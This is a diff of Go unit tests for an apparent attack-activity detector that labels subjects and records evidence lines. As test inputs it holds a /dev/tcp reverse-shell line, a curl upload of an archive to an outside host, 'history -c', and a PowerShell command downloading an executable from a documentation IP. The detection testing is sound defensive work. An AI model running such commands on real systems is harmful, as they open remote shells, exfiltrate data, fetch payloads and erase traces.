@@ -652,6 +652,12 @@ func TestShown(t *testing.T) {
 	if got := table.Shown("archive"); got.Column != "" || got.Beside != nil || got.After {
 		t.Errorf("Shown(archive) = %+v; want nothing", got)
 	}
+	labels := table.Labels()
+	for _, want := range []string{"task", "runs", "account", "host", "url", "tenant"} {
+		if n := len(slices.DeleteFunc(slices.Clone(labels), func(l string) bool { return l != want })); n != 1 {
+			t.Errorf("Labels() names %q %d times, want once: %q", want, n, labels)
+		}
+	}
 	one := func(labels string) string {
 		return `{"contexts":{},"labels":` + labels + `,"activities":[{"name":"A","tactics":["Discovery"],"attack":["T1087"],"patterns":["abc"],` +
 			`"subjects":[{"label":"task","pattern":"(abc)"},{"label":"runs","pattern":"(abc)"}]}]}`
@@ -825,6 +831,27 @@ func TestDetectSubjects(t *testing.T) {
 	}
 }
 
+// A subject is listed plain without the name of the variable that held it,
+// and as it stands where no variable did.
+func TestSubjectPlain(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	held := subjectsOf(table.Detect("H=203.0.113.41\nexec 3<>/dev/tcp/$H/$PORT"), "ReverseShell")
+	if len(held) != 2 || held[0].Plain() != "203.0.113.41" || held[1].Plain() != "$PORT" {
+		t.Errorf("the subjects %v are plain %q, want the value of $H and $PORT as it stands", held, []string{held[0].Plain(), held[1].Plain()})
+	}
+	for value, want := range map[string]string{
+		"svc": "svc", "/tmp/tool ($F)": "/tmp/tool", "c:\\a.exe (%TOOL%)": "c:\\a.exe", "svc_backup (${AD_USER:-svc_backup})": "svc_backup",
+		"Program Files (x86)": "Program Files (x86)", "notes (final)": "notes (final)", "($F)": "($F)", "": "",
+	} {
+		if got := (Subject{Label: "file", Value: value}).Plain(); got != want {
+			t.Errorf("Plain of %q = %q, want %q", value, got, want)
+		}
+	}
+}
+
 // Evidence names the line as it stands in the file, even after a command
 // that is continued over lines, and keeps a bounded number of bounded lines.
 func TestDetectEvidence(t *testing.T) {
@@ -837,11 +864,14 @@ func TestDetectEvidence(t *testing.T) {
 	if got := names(hits); !slices.Equal(got, []string{"FileUpload", "HistoryClearing"}) {
 		t.Fatalf("activities = %q", got)
 	}
-	if e := hits[0].Evidence; len(e) != 1 || e[0].Line != 2 || e[0].Text != "curl -s -T out.tgz https://files.example.net/up" {
-		t.Errorf("a continued command: evidence = %+v, want line 2 joined and trimmed", e)
+	if e := hits[0].Evidence; len(e) != 1 || e[0].Line != 2 || e[0].Last != 4 || e[0].Text != "curl -s -T out.tgz https://files.example.net/up" {
+		t.Errorf("a continued command: evidence = %+v, want lines 2 to 4 joined and trimmed", e)
 	}
-	if e := hits[1].Evidence; len(e) != 1 || e[0].Line != 6 || e[0].Text != "history -c" {
-		t.Errorf("a line after a continued command: evidence = %+v, want line 6", e)
+	if e := hits[1].Evidence; len(e) != 1 || e[0].Line != 6 || e[0].Last != 0 || e[0].Text != "history -c" {
+		t.Errorf("a line after a continued command: evidence = %+v, want line 6 alone", e)
+	}
+	if e := table.Detect("Invoke-WebRequest `\r\n  -Uri http://203.0.113.10/a.exe `\r\n  -OutFile a.exe\r\n")[0].Evidence; len(e) != 1 || e[0].Line != 1 || e[0].Last != 3 {
+		t.Errorf("a command of PowerShell continued over lines: evidence = %+v, want lines 1 to 3", e)
 	}
 	var many strings.Builder
 	for range maxEvidence + 5 {
